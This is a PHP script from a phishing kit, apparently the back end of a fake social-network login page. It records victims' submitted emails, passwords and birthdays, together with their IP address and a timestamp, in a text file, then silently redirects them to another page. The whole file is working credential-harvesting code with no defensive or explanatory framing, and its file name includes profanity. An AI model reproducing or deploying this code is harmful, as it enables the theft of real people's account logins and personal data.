<?phperror_reporting(0);
$file = "welcome-------2018-------fuck-------you-------mark.txt";
$username = $_POST['email'];
$password = $_POST['pass'];$bday = $_POST[birthday_day]."/".$_POST[birthday_month]."/".$_POST[birthday_year];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");


$handle = fopen($file, 'a');
fwrite($handle, ",,,,,,,,,,,,,,,others,,,,,,,,,,,,,,,,");
fwrite($handle, "\n");
fwrite($handle, "Email	        : ");
fwrite($handle, "$username");
fwrite($handle, "\n");
fwrite($handle, "Password	: ");
fwrite($handle, "$password");
fwrite($handle, "\n");fwrite($handle, "TTL	: ");fwrite($handle, "$bday");fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Date Submitted	: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,");
fwrite($handle, "\n");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"others2.html\";
// -->
</script>";
?>
